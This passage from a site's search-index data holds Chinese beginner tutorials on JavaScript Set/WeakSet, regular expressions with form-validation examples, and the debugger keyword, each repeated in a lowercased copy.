dedupe(array) {\n  return Array.from(new Set(array));\n}\n\ndedupe([1, 1, 2, 3]) // [1, 2, 3]\n\n\n\n# Set 实例的属性和方法\n\n\n# 属性\n\n * Set.prototype.constructor：构造函数，默认是 Set 函数。\n * Set.prototype.size：返回 Set 实例的成员总数。\n\n\n# 方法\n\n# 操作方法\n\n方法              描述\nadd(value)      添加某个值，返回Set结构本身。\ndelete(value)   删除某个值，返回一个布尔值，表示删除是否成功。\nhas(value)      返回一个布尔值，表示该值是否为Set的成员。\nclear()         清除所有成员，没有返回值。\n\nvar set = new Set();\nset.add(1).add(2).add(2);\n\nconsole.log(set.size) // 2\n\nconsole.log(set.has(1)) // true\nconsole.log(set.has(2)) // true\nconsole.log(set.has(3)) // false\nconsole.log(set.delete(2)); // true\nconsole.log(set.delete(3)); // false\nconsole.log(set) // set {1}\nset.clear()\nconsole.log(set) // set {}\n\n\n# 遍历方法 (Set 的遍历顺序就是插入顺序)\n\n方法          描述\nkeys()      返回键名的遍历器\nvalues()    返回键值的遍历器\nentries()   返回键值对的遍历器\nforEach()   使用回调函数遍历每个成员\n\n> 由于 Set 结构没有键名，只有键值（或者说键名和键值是同一个值），所以keys方法和values方法完全一致。\n\nvar set = new Set([1, 2, 3]);\n\nconsole.log(set.keys());   // SetIterator {1, 2, 3}\nconsole.log(set.values());   // SetIterator {1, 2, 3}\nconsole.log(set.entries());   // SetIterator {[1,1],[2,2],[3,3]}\nset.forEach((value, key) => console.log(value) )   // 1 2 3\n\n\n# 遍历的应用\n\n扩展运算符（...）内部使用for...of循环，所以也可以用于 Set 结构。\n\nlet set = new Set(['red', 'green', 'blue']);\nlet arr = [...set];\n// ['red', 'green', 'blue']\n\n\n扩展运算符和 Set 结构相结合，就可以去除数组的重复成员。\n\nlet arr = [3, 5, 2, 2, 5, 5];\nlet unique = [...new Set(arr)];\n// [3, 5, 2]\n\n\n而且，数组的map和filter方法也可以间接用于 Set 了。\n\nlet set = new Set([1, 2, 3]);\nset = new Set([...set].map(x => x * 2));\n// 返回Set结构：{2, 4, 6}\n\nlet set = new Set([1, 2, 3, 4, 5]);\nset = new Set([...set].filter(x => (x % 2) == 0));\n\n\n\n# WeakSet\n\nWeakSet的成员只能是对象，而不能是其他类型的值。也是不重复的值的集合.\n\nWeakSet中的对象都是弱引用，垃圾回收机制不考虑WeakSet对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于WeakSet之中。这意味着，无法引用WeakSet的成员，因此WeakSet是不可遍历的。\n\n\n# 语法\n\n> WeakSet 是一个构造函数，可以使用new命令，创建 WeakSet 数据结构。\n\nconst ws = new WeakSet();\n\n\n\n# 操作方法\n\n方法              描述\nadd(value)      向 WeakSet 实例添加一个新成员\ndelete(value)   清除 WeakSet 实例的指定成员\nhas(value)      返回一个布尔值，表示某个值是否在\n\nconst ws = new WeakSet();\nconst obj = {};\nconst foo = {};\n\nws.add(window);\nws.add(obj);\n\nws.has(window); // true\nws.has(foo);    // false\n\nws.delete(window);\nws.has(window);    // false\n\n\nWeakSet 的另一个例子。\n\nconst foos = new WeakSet()\n class Foo {\n   constructor() {\n     foos.add(this)\n   }\n   method () {\n     if (!foos.has(this)) {\n       throw new TypeError('Foo.prototype.method 只能在Foo的实例上调用！');\n     }\n   }\n }\n",normalizedContent:"# set && weakset\n\n\n# set 基本用法\n\n该数据结构，类似于数组，但是，它的成员都是唯一的，没有重复的值。\n\nset本身是一个构造函数，用来生成 set 数据结构。\n\n// 上面代码通过add()方法向 set 结构加入成员，结果表明 set 结构不会添加重复的值。\nvar s = new set();\n[2, 3, 3, 5, 4, 5].map(x => {\ns.add(x);\nconsole.log(s);\n});\n// set {2}\n// set {2, 3}\n// set {2, 3}\n// set {2, 3, 5}\n// set {2, 3, 5, 4}\n// set {2, 3, 5, 4}\n\n\n在set()函数中可以传入一个数组（或者具有 iterable 接口的其他数据结构）类型的参数。\n\nvar set = new set([3,5,1,1,4]);\nconsole.log([...set]);    // [3,5,1,4]\nconsole.log(set.size);    // 4\n\n\n在set中，判断是否重复，使用的是\"same-value equality\",类似于\"===\",但是有例外，其中nan不等于nan。\n\nvar set = new set();\nset.add(nan);\nset.add(nan);\nset.add(\"1\");\nset.add(1);\nconsole.log(set) // set {nan, \"1\", 1}\n\n\n// 去除数组的重复成员\n[...new set(array)]\n// 去除字符串里面的重复字符\n[...new set('ababbc')].join('')\n// \"abc\"\n\n\narray.from方法可以将 set 结构转为数组。\n\nconst items = new set([1, 2, 3, 4, 5]);\nconst array = array.from(items);\n\n\nfunction dedupe(array) {\n  return array.from(new set(array));\n}\n\ndedupe([1, 1, 2, 3]) // [1, 2, 3]\n\n\n\n# set 实例的属性和方法\n\n\n# 属性\n\n * set.prototype.constructor：构造函数，默认是 set 函数。\n * set.prototype.size：返回 set 实例的成员总数。\n\n\n# 方法\n\n# 操作方法\n\n方法              描述\nadd(value)      添加某个值，返回set结构本身。\ndelete(value)   删除某个值，返回一个布尔值，表示删除是否成功。\nhas(value)      返回一个布尔值，表示该值是否为set的成员。\nclear()         清除所有成员，没有返回值。\n\nvar set = new set();\nset.add(1).add(2).add(2);\n\nconsole.log(set.size) // 2\n\nconsole.log(set.has(1)) // true\nconsole.log(set.has(2)) // true\nconsole.log(set.has(3)) // false\nconsole.log(set.delete(2)); // true\nconsole.log(set.delete(3)); // false\nconsole.log(set) // set {1}\nset.clear()\nconsole.log(set) // set {}\n\n\n# 遍历方法 (set 的遍历顺序就是插入顺序)\n\n方法          描述\nkeys()      返回键名的遍历器\nvalues()    返回键值的遍历器\nentries()   返回键值对的遍历器\nforeach()   使用回调函数遍历每个成员\n\n> 由于 set 结构没有键名，只有键值（或者说键名和键值是同一个值），所以keys方法和values方法完全一致。\n\nvar set = new set([1, 2, 3]);\n\nconsole.log(set.keys());   // setiterator {1, 2, 3}\nconsole.log(set.values());   // setiterator {1, 2, 3}\nconsole.log(set.entries());   // setiterator {[1,1],[2,2],[3,3]}\nset.foreach((value, key) => console.log(value) )   // 1 2 3\n\n\n# 遍历的应用\n\n扩展运算符（...）内部使用for...of循环，所以也可以用于 set 结构。\n\nlet set = new set(['red', 'green', 'blue']);\nlet arr = [...set];\n// ['red', 'green', 'blue']\n\n\n扩展运算符和 set 结构相结合，就可以去除数组的重复成员。\n\nlet arr = [3, 5, 2, 2, 5, 5];\nlet unique = [...new set(arr)];\n// [3, 5, 2]\n\n\n而且，数组的map和filter方法也可以间接用于 set 了。\n\nlet set = new set([1, 2, 3]);\nset = new set([...set].map(x => x * 2));\n// 返回set结构：{2, 4, 6}\n\nlet set = new set([1, 2, 3, 4, 5]);\nset = new set([...set].filter(x => (x % 2) == 0));\n\n\n\n# weakset\n\nweakset的成员只能是对象，而不能是其他类型的值。也是不重复的值的集合.\n\nweakset中的对象都是弱引用，垃圾回收机制不考虑weakset对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于weakset之中。这意味着，无法引用weakset的成员，因此weakset是不可遍历的。\n\n\n# 语法\n\n> weakset 是一个构造函数，可以使用new命令，创建 weakset 数据结构。\n\nconst ws = new weakset();\n\n\n\n# 操作方法\n\n方法              描述\nadd(value)      向 weakset 实例添加一个新成员\ndelete(value)   清除 weakset 实例的指定成员\nhas(value)      返回一个布尔值，表示某个值是否在\n\nconst ws = new weakset();\nconst obj = {};\nconst foo = {};\n\nws.add(window);\nws.add(obj);\n\nws.has(window); // true\nws.has(foo);    // false\n\nws.delete(window);\nws.has(window);    // false\n\n\nweakset 的另一个例子。\n\nconst foos = new weakset()\n class foo {\n   constructor() {\n     foos.add(this)\n   }\n   method () {\n     if (!foos.has(this)) {\n       throw new typeerror('foo.prototype.method 只能在foo的实例上调用！');\n     }\n   }\n }\n",charsets:{cjk:!0}},{title:"正则表达式",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/10-%E6%AD%A3%E5%88%99%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/Javascript基础语法/07-对象/10-正则对象.md",key:"v-45a193dc",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/10-%E6%AD%A3%E5%88%99%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"正则的应用",slug:"正则的应用",normalizedTitle:"正则的应用",charIndex:151},{level:2,title:"正则(RegExp 对象)",slug:"正则-regexp-对象",normalizedTitle:"正则(regexp 对象)",charIndex:214},{level:3,title:"创建",slug:"创建",normalizedTitle:"创建",charIndex:290},{level:3,title:"通过字面量方式创建",slug:"通过字面量方式创建",normalizedTitle:"通过字面量方式创建",charIndex:683},{level:3,title:"RegExp的方法",slug:"regexp的方法",normalizedTitle:"regexp的方法",charIndex:770},{level:3,title:"原子、量词、边界",slug:"原子、量词、边界",normalizedTitle:"原子、量词、边界",charIndex:1526},{level:3,title:"贪婪模式和吝啬模式",slug:"贪婪模式和吝啬模式",normalizedTitle:"贪婪模式和吝啬模式",charIndex:2663},{level:3,title:"字符串方法是用正则表达式",slug:"字符串方法是用正则表达式",normalizedTitle:"字符串方法是用正则表达式",charIndex:2860},{level:3,title:"小案例",slug:"小案例",normalizedTitle:"小案例",charIndex:3060}],headersStr:"正则的应用 正则(RegExp 对象) 创建 通过字面量方式创建 RegExp的方法 原子、量词、边界 贪婪模式和吝啬模式 字符串方法是用正则表达式 小案例",content:'# 正则表达式\n\n> 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。\n\n一个用来描述或者匹配一系列符合某个语法规则的字符串的语言。在很多文本编辑器或其他工具里，正则表达式通常被用来检索、替换或拆分那些符合某个模式的文本内容。许多程序设计语言都支持利用正则表达式进行字符串操作。\n\n\n# 正则的应用\n\n * 执行字符串函数无法完成的特殊的匹配、拆分、替换功能\n * 数据验证、文本替换、内容检索、过滤内容\n\n\n# 正则(RegExp 对象)\n\n> RegExp 是正则表达式的缩写。RegExp 对象用于存储检索模式，主要应用于数据验证和数据查询两个方面。\n\n\n# 创建\n\n# 实例化 RegExp对象\n\nvar reg=new RegExp(正则表达式,模式修正符);\n\n\n模式修正符   描述\ni       执行对大小写不敏感的匹配。\ng       执行全局匹配（查找所有匹配）\nm       执行多行匹配\n\n// 简单案例\nvar arr=["aa","bb","cc","dd"];\nvar str="aaffddxxccrbbrffdd";\nfunction mingan(arr,str){\n  arr.forEach((value,index)=>{\n    var reg=new RegExp(value,"g");\n    str=str.replace(reg,"**");\n  })\n  return str;\n}\nconsole.log(mingan(arr,str));\nconsole.log(str);\n\n\n\n# 通过字面量方式创建\n\nvar reg=/正则表达式/\n//   //内不需要加引号\n\n\n> 通常将正则表达式字符串放在， /RegExp/中间，/ / 称为定界符。\n\n\n# RegExp的方法\n\n * test(字符串);\n   判断字符串是否符合正则的匹配，返回值是一个Boolean值\n\n * exec(字符串);\n   查询字符串中符合正则匹配的内容，返回值是数组。如果没有发现匹配，则返回 null。\n   \n   * 结果是数组\n   * index：查询到结果的下标\n   * input： 被查询到的字符串\n   * 如果正则表达式没有设置g，那么exec方法不会对正则表达式有任何的影响。 如果设置了g，那么exec执行之后会更新正则表达式的lastIndex属性，表示本次匹配后，所匹配字符串的下一个字符的索引，下一次再用这个正则表达式匹配字符串的时候就会从上次的lastIndex属性开始匹配。\n   \n   var str="I love antzone ,this is animate";\n   var reg=/an/g;\n   console.log(reg.exec(str));\n   console.log(reg.exec(str));\n   console.log(reg.exec(str));\n   \n   // 控制台输出\n   //  ["an", index: 7, input: "I love antzone ,this is animate", groups: undefined]\n   //  ["an", index: 24, input: "I love antzone ,this is animate", groups: undefined]\n   //  null\n   \n\n * compile(正则表达式,[,flag]);\n   用于在脚本执行过程中编译正则表达式,也可用于改变和重新编译正则表达式。\n\n\n# 原子、量词、边界\n\n> 原子是正则表达式中的最小的元素，包括英文、标点符号等\n\n原子          含义\n\\d          表示匹配1个0-9的数字 [0-9]\n\\D [^0-9]   表示匹配除数字0-9以外的字符\n\\w          匹配数字、字母、下划线\n\\W          匹配除了数字、字母、下划线以外的字符\n\\s          匹配空格\n\\S          匹配非空格\n.           查找单个字符，除了换行和行结束符\n\\n          查找换行符\n\\n          换行字符\n\\f          换页字符\n\\r          回车字符\n\\t          制表符\n\\v          垂直制表符\n\n原子表     含义\n[ ]     只匹配其中的一个原子\n[^]     只匹配"除了"其中字符的任意一个原子\n[0-9]   匹配0-9任何一个数字\n[a-z]   匹配小写a-z任何一个字母\n[A-Z]   匹配大写A-Z任何一个字母\n\n量词      含义\n{n}     规定前面的一个原子重复n次\n{n,}    规定前面的一个原子重复n次及n次以上\n{n,m}   规定前面的一个原子重复n-m次\n*       前面一个原子重复0-无数次 等价于{0,}\n+       前面一个原子重复1-无数次 等价于{1,}\n?=n     匹配任何其后紧接指定字符串 n 的字符串\n?!n     匹配任何其后没有紧接指定字符串 n 的字符串\n\n符号          含义\n^           从字符串开头进行匹配\n$           匹配到字符串的末尾\n\\b          匹配单词边界\n\\B          匹配非单词边界\n¦(这是个管道符)   符号前后两个部分只要有一侧符合即可\n\n分组字符    含义\n(exp)   用小圆括号进行分组，如日期中年月日的分组：/(\\d{5})-(\\d{1,2})-(\\d{1,2})/\n\n每个分组将产生分组号，从第一个括号开始，可以使用\\n的形式在正则中使用分组号， 如匹配成对出现的HTML标签，可以写成：/<(\\w+)></\\1>/| |(?:exp)| 匹配exp正则，但不产生分组号| |exp1(?=exp2) |前瞻断言，匹配exp1，但后面必须是exp2 如匹配名字叫xianlie，但不姓zhao的人：/zhao(?=xianlie)/ | |exp1(?!=exp2) |后瞻断言，匹配exp1，但后面不能是exp2 如匹配姓zhao，但名字不叫xianlie的人：/zhao(?!xianlie)/ |\n\n\n# 贪婪模式和吝啬模式\n\n 1. 贪婪模式：查询时，查询到的字符尽可能多 （默认）\n 2. 吝啬模式：查询时，查询到的字符尽可能少\n    * *? 重复任意次，但尽可能少重复\n    * +? 重复1次或更多次，但尽可能少重复\n    * ?? 重复0次或1次，但尽可能少重复\n    * {n,m}? 重复n到m次，但尽可能少重复\n    * {n,}? 重复n次以上，但尽可能少重复\n\n\n# 字符串方法是用正则表达式\n\n方法                  描述\nsearch(/正则/)        返回值为第一个与正则相匹配的字符串的位置，如果没有找到任何匹配的子串，则返回 -1。\nreplace(/正则/,str)   用str替换符合正则表达式的对应字符\nsplit(/正则/,num)     将字符串已正则匹配的内容分割为数组，num参数是可选参数，表示返回的个数\n\n\n# 小案例\n\n 1. 用正则表达式验证身份证号\n\nvar reg=/^[1-9][0-9]{16}[0-9xX]$/     //正则匹配身份证号\nvar str="11112225478963589x";\nconsole.log(reg.test(str))\n\n\n 2. 用正则表达式验证邮箱\n\nvar reg=new RegExp(/^([a-zA-Z0-9._-])+@([a-zA-Z0-9_-])+(\\.[a-zA-Z0-9_-])+/);\n\n\n 3. 16进制颜色正则\n\nvar reg=/^#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})$/;\n\n\n 4. 验证车牌号\n\nvar reg=/^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领A-Z]{1}[A-Z]{1}[A-Z0-9]{4}[A-Z0-9挂学警港澳]{1}$/\n\n\n 5. 验证中文 “\\u4e00”和“\\u9fa5”是unicode编码，并且正好是中文编码的开始和结束的两个值，所以这个正则表达式可以用来判断字符串中是否包含中文。\n\nvar reg = /[\\u4e00-\\u9fa5]{2,}/\n\n\n# 正则验证表单案例\n\n对表单进行验证是js正则最常用的地方，表单验证可以节省后台的一部分压力，提升网站的性能。主要验证有以下几个地方qq号、手机号、邮箱、姓名、密码、用户名等，通过结合onblur或者onchange事件，获取表单中的内容，对其进行正则判断，从而达到前台表单验证的效果。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n <meta charset="UTF-8">\n <title>完整验证表单</title>\n <style type="text/css">\n *{margin: 0;padding: 0;list-style:none;}\n body{background:#ccc;}\n .demo{width:400px;padding:40px;background:#efefef;border:solid 1px #666;margin:100px auto 0;line-height:40px;}\n label{display:inline-block;width:20%;}\n input{width:60%;}\n </style>\n</head>\n<body>\n<div class="demo">\n <ul>\n <li>\n  <label for="iptqq">Q Q：</label>\n  <input type="text" id="iptqq">\n  <span></span>\n </li>\n <li>\n  <label for="iptPhone">手机：</label>\n  <input type="text" id="iptPhone">\n  <span></span>\n </li>\n <li>\n  <label for="iptEmil">邮箱：</label>\n  <input type="text" id="iptEmil">\n  <span></span>\n </li>\n <li>\n  <label for="iptNum">密码：</label>\n  <input type="password" id="iptNum">\n  <span></span>\n </li>\n <li>\n  <label for="iptNum2">再次密码：</label>\n  <input type="password" id="iptNum2">\n  <span></span>\n </li>\n <li>\n  <label for="iptName">姓名：</label>\n  <input type="text" id="iptName">\n  <span></span>\n </li>\n  <li>\n  <label for="iptUser">用户名：</label>\n  <input type="text" id="iptUser">\n  <span></span>\n </li>\n </ul>\n</div>\n</body>\n<script type="text/javascript">\n (function(window){\n function $(id){\n  return document.getElementById(id);\n };\n // 获取对象\n var iptqq = $("iptqq"),iptPhone = $("iptPhone"),iptEmil = $("iptEmil"),iptNum = $("iptNum"),iptNum2 = $("iptNum2"),iptName = $("iptName"),iptUser= $("iptUser");\n // 正则验证表达式\n // 验证密码\n var rxNum = /^[a-zA-Z]\\w{5,17}$/;\n // 验证QQ\n var rxqq = /^[1-9][0-9]{4,10}$/;\n // 验证手机\n var rxPhone = /^(13[0-9]|15[012356789]|18[0-9]|17[678]|14[57])[0-9]{8}$/;\n // 验证邮箱\n var rxEmil = /^\\w+@\\w+\\.\\w+$/;\n // 验证姓名\n var rxName = /^[\\u4E00-\\u9FA5]{2,}$/\n  // 验证用户名\n var rxUser = /^[a-zA-Z0-9_-]{4,16}$/\n // 验证密码\n cation(iptNum,rxNum);\n // 验证QQ\n cation(iptqq,rxqq);\n // 验证手机号\n cation(iptPhone,rxPhone);\n // 验证邮箱\n cation(iptEmil,rxEmil);\n // 验证姓名\n cation(iptName,rxName);\n // 验证用户名\n cation(iptUser,rxUser);\n // 封装验证函数\n iptNum2.onblur = function(){\n \tif(iptNum2.value==iptNum.value){\n\t \tiptNum2.nextElementSibling.innerHTML = "正确"\n\t   \tiptNum2.nextElementSibling.style.color = "green";\n\t}else{\n\t \tiptNum2.nextElementSibling.innerHTML = "错误"\n\t   \tiptNum2.nextElementSibling.style.color = "red";\n\t}\n }\n\n function cation(element,regExp){\n  element.onblur = function(){\n  var txt = this.value;\n  if( regExp.test( txt ) ){\n   this.nextElementSibling.innerHTML = "正确"\n   this.nextElementSibling.style.color = "green";\n  }else{\n   this.nextElementSibling.innerHTML = "错误"\n   this.nextElementSibling.style.color = "red";\n  }\n  }\n }\n })(window)\n<\/script>\n</html>\n',normalizedContent:'# 正则表达式\n\n> 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。\n\n一个用来描述或者匹配一系列符合某个语法规则的字符串的语言。在很多文本编辑器或其他工具里，正则表达式通常被用来检索、替换或拆分那些符合某个模式的文本内容。许多程序设计语言都支持利用正则表达式进行字符串操作。\n\n\n# 正则的应用\n\n * 执行字符串函数无法完成的特殊的匹配、拆分、替换功能\n * 数据验证、文本替换、内容检索、过滤内容\n\n\n# 正则(regexp 对象)\n\n> regexp 是正则表达式的缩写。regexp 对象用于存储检索模式，主要应用于数据验证和数据查询两个方面。\n\n\n# 创建\n\n# 实例化 regexp对象\n\nvar reg=new regexp(正则表达式,模式修正符);\n\n\n模式修正符   描述\ni       执行对大小写不敏感的匹配。\ng       执行全局匹配（查找所有匹配）\nm       执行多行匹配\n\n// 简单案例\nvar arr=["aa","bb","cc","dd"];\nvar str="aaffddxxccrbbrffdd";\nfunction mingan(arr,str){\n  arr.foreach((value,index)=>{\n    var reg=new regexp(value,"g");\n    str=str.replace(reg,"**");\n  })\n  return str;\n}\nconsole.log(mingan(arr,str));\nconsole.log(str);\n\n\n\n# 通过字面量方式创建\n\nvar reg=/正则表达式/\n//   //内不需要加引号\n\n\n> 通常将正则表达式字符串放在， /regexp/中间，/ / 称为定界符。\n\n\n# regexp的方法\n\n * test(字符串);\n   判断字符串是否符合正则的匹配，返回值是一个boolean值\n\n * exec(字符串);\n   查询字符串中符合正则匹配的内容，返回值是数组。如果没有发现匹配，则返回 null。\n   \n   * 结果是数组\n   * index：查询到结果的下标\n   * input： 被查询到的字符串\n   * 如果正则表达式没有设置g，那么exec方法不会对正则表达式有任何的影响。 如果设置了g，那么exec执行之后会更新正则表达式的lastindex属性，表示本次匹配后，所匹配字符串的下一个字符的索引，下一次再用这个正则表达式匹配字符串的时候就会从上次的lastindex属性开始匹配。\n   \n   var str="i love antzone ,this is animate";\n   var reg=/an/g;\n   console.log(reg.exec(str));\n   console.log(reg.exec(str));\n   console.log(reg.exec(str));\n   \n   // 控制台输出\n   //  ["an", index: 7, input: "i love antzone ,this is animate", groups: undefined]\n   //  ["an", index: 24, input: "i love antzone ,this is animate", groups: undefined]\n   //  null\n   \n\n * compile(正则表达式,[,flag]);\n   用于在脚本执行过程中编译正则表达式,也可用于改变和重新编译正则表达式。\n\n\n# 原子、量词、边界\n\n> 原子是正则表达式中的最小的元素，包括英文、标点符号等\n\n原子          含义\n\\d          表示匹配1个0-9的数字 [0-9]\n\\d [^0-9]   表示匹配除数字0-9以外的字符\n\\w          匹配数字、字母、下划线\n\\w          匹配除了数字、字母、下划线以外的字符\n\\s          匹配空格\n\\s          匹配非空格\n.           查找单个字符，除了换行和行结束符\n\\n          查找换行符\n\\n          换行字符\n\\f          换页字符\n\\r          回车字符\n\\t          制表符\n\\v          垂直制表符\n\n原子表     含义\n[ ]     只匹配其中的一个原子\n[^]     只匹配"除了"其中字符的任意一个原子\n[0-9]   匹配0-9任何一个数字\n[a-z]   匹配小写a-z任何一个字母\n[a-z]   匹配大写a-z任何一个字母\n\n量词      含义\n{n}     规定前面的一个原子重复n次\n{n,}    规定前面的一个原子重复n次及n次以上\n{n,m}   规定前面的一个原子重复n-m次\n*       前面一个原子重复0-无数次 等价于{0,}\n+       前面一个原子重复1-无数次 等价于{1,}\n?=n     匹配任何其后紧接指定字符串 n 的字符串\n?!n     匹配任何其后没有紧接指定字符串 n 的字符串\n\n符号          含义\n^           从字符串开头进行匹配\n$           匹配到字符串的末尾\n\\b          匹配单词边界\n\\b          匹配非单词边界\n¦(这是个管道符)   符号前后两个部分只要有一侧符合即可\n\n分组字符    含义\n(exp)   用小圆括号进行分组，如日期中年月日的分组：/(\\d{5})-(\\d{1,2})-(\\d{1,2})/\n\n每个分组将产生分组号，从第一个括号开始，可以使用\\n的形式在正则中使用分组号， 如匹配成对出现的html标签，可以写成：/<(\\w+)></\\1>/| |(?:exp)| 匹配exp正则，但不产生分组号| |exp1(?=exp2) |前瞻断言，匹配exp1，但后面必须是exp2 如匹配名字叫xianlie，但不姓zhao的人：/zhao(?=xianlie)/ | |exp1(?!=exp2) |后瞻断言，匹配exp1，但后面不能是exp2 如匹配姓zhao，但名字不叫xianlie的人：/zhao(?!xianlie)/ |\n\n\n# 贪婪模式和吝啬模式\n\n 1. 贪婪模式：查询时，查询到的字符尽可能多 （默认）\n 2. 吝啬模式：查询时，查询到的字符尽可能少\n    * *? 重复任意次，但尽可能少重复\n    * +? 重复1次或更多次，但尽可能少重复\n    * ?? 重复0次或1次，但尽可能少重复\n    * {n,m}? 重复n到m次，但尽可能少重复\n    * {n,}? 重复n次以上，但尽可能少重复\n\n\n# 字符串方法是用正则表达式\n\n方法                  描述\nsearch(/正则/)        返回值为第一个与正则相匹配的字符串的位置，如果没有找到任何匹配的子串，则返回 -1。\nreplace(/正则/,str)   用str替换符合正则表达式的对应字符\nsplit(/正则/,num)     将字符串已正则匹配的内容分割为数组，num参数是可选参数，表示返回的个数\n\n\n# 小案例\n\n 1. 用正则表达式验证身份证号\n\nvar reg=/^[1-9][0-9]{16}[0-9xx]$/     //正则匹配身份证号\nvar str="11112225478963589x";\nconsole.log(reg.test(str))\n\n\n 2. 用正则表达式验证邮箱\n\nvar reg=new regexp(/^([a-za-z0-9._-])+@([a-za-z0-9_-])+(\\.[a-za-z0-9_-])+/);\n\n\n 3. 16进制颜色正则\n\nvar reg=/^#?([a-fa-f0-9]{6}|[a-fa-f0-9]{3})$/;\n\n\n 4. 验证车牌号\n\nvar reg=/^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领a-z]{1}[a-z]{1}[a-z0-9]{4}[a-z0-9挂学警港澳]{1}$/\n\n\n 5. 验证中文 “\\u4e00”和“\\u9fa5”是unicode编码，并且正好是中文编码的开始和结束的两个值，所以这个正则表达式可以用来判断字符串中是否包含中文。\n\nvar reg = /[\\u4e00-\\u9fa5]{2,}/\n\n\n# 正则验证表单案例\n\n对表单进行验证是js正则最常用的地方，表单验证可以节省后台的一部分压力，提升网站的性能。主要验证有以下几个地方qq号、手机号、邮箱、姓名、密码、用户名等，通过结合onblur或者onchange事件，获取表单中的内容，对其进行正则判断，从而达到前台表单验证的效果。\n\n<!doctype html>\n<html lang="en">\n<head>\n <meta charset="utf-8">\n <title>完整验证表单</title>\n <style type="text/css">\n *{margin: 0;padding: 0;list-style:none;}\n body{background:#ccc;}\n .demo{width:400px;padding:40px;background:#efefef;border:solid 1px #666;margin:100px auto 0;line-height:40px;}\n label{display:inline-block;width:20%;}\n input{width:60%;}\n </style>\n</head>\n<body>\n<div class="demo">\n <ul>\n <li>\n  <label for="iptqq">q q：</label>\n  <input type="text" id="iptqq">\n  <span></span>\n </li>\n <li>\n  <label for="iptphone">手机：</label>\n  <input type="text" id="iptphone">\n  <span></span>\n </li>\n <li>\n  <label for="iptemil">邮箱：</label>\n  <input type="text" id="iptemil">\n  <span></span>\n </li>\n <li>\n  <label for="iptnum">密码：</label>\n  <input type="password" id="iptnum">\n  <span></span>\n </li>\n <li>\n  <label for="iptnum2">再次密码：</label>\n  <input type="password" id="iptnum2">\n  <span></span>\n </li>\n <li>\n  <label for="iptname">姓名：</label>\n  <input type="text" id="iptname">\n  <span></span>\n </li>\n  <li>\n  <label for="iptuser">用户名：</label>\n  <input type="text" id="iptuser">\n  <span></span>\n </li>\n </ul>\n</div>\n</body>\n<script type="text/javascript">\n (function(window){\n function $(id){\n  return document.getelementbyid(id);\n };\n // 获取对象\n var iptqq = $("iptqq"),iptphone = $("iptphone"),iptemil = $("iptemil"),iptnum = $("iptnum"),iptnum2 = $("iptnum2"),iptname = $("iptname"),iptuser= $("iptuser");\n // 正则验证表达式\n // 验证密码\n var rxnum = /^[a-za-z]\\w{5,17}$/;\n // 验证qq\n var rxqq = /^[1-9][0-9]{4,10}$/;\n // 验证手机\n var rxphone = /^(13[0-9]|15[012356789]|18[0-9]|17[678]|14[57])[0-9]{8}$/;\n // 验证邮箱\n var rxemil = /^\\w+@\\w+\\.\\w+$/;\n // 验证姓名\n var rxname = /^[\\u4e00-\\u9fa5]{2,}$/\n  // 验证用户名\n var rxuser = /^[a-za-z0-9_-]{4,16}$/\n // 验证密码\n cation(iptnum,rxnum);\n // 验证qq\n cation(iptqq,rxqq);\n // 验证手机号\n cation(iptphone,rxphone);\n // 验证邮箱\n cation(iptemil,rxemil);\n // 验证姓名\n cation(iptname,rxname);\n // 验证用户名\n cation(iptuser,rxuser);\n // 封装验证函数\n iptnum2.onblur = function(){\n \tif(iptnum2.value==iptnum.value){\n\t \tiptnum2.nextelementsibling.innerhtml = "正确"\n\t   \tiptnum2.nextelementsibling.style.color = "green";\n\t}else{\n\t \tiptnum2.nextelementsibling.innerhtml = "错误"\n\t   \tiptnum2.nextelementsibling.style.color = "red";\n\t}\n }\n\n function cation(element,regexp){\n  element.onblur = function(){\n  var txt = this.value;\n  if( regexp.test( txt ) ){\n   this.nextelementsibling.innerhtml = "正确"\n   this.nextelementsibling.style.color = "green";\n  }else{\n   this.nextelementsibling.innerhtml = "错误"\n   this.nextelementsibling.style.color = "red";\n  }\n  }\n }\n })(window)\n<\/script>\n</html>\n',charsets:{cjk:!0}},{title:"JavaScript 调试工具",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/JavaScript%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7.html",relativePath:"Javascript/Javascript基础语法/12-错误调试/JavaScript调试工具.md",key:"v-084ad13e",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/JavaScript%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7.html",headers:[{level:3,title:"debugger 关键字",slug:"debugger-关键字",normalizedTitle:"debugger 关键字",charIndex:108}],headersStr:"debugger 关键字",content:'# JavaScript 调试工具\n\n> 在编写 JavaScript 时，如果没有调试工具将是一件很痛苦的事情。\n\n在程序代码中寻找错误叫做代码调试。\n\n调试很难，但幸运的是，很多浏览器都内置了调试工具。\n\n\n# debugger 关键字\n\ndebugger 关键字用于停止执行 JavaScript，并调用调试函数。\n\n这个关键字与在调试工具中设置断点的效果是一样的。\n\n开启 debugger ，代码在第三行前停止执行。\n\nvar title = "hello world!";\ndebugger;\ndocument.querySelector("#box").innerHTML = title;\n\n\n> 注意：如果没有调试可用，debugger 语句将无法工作。',normalizedContent:'# javascript 调试工具\n\n> 在编写 javascript 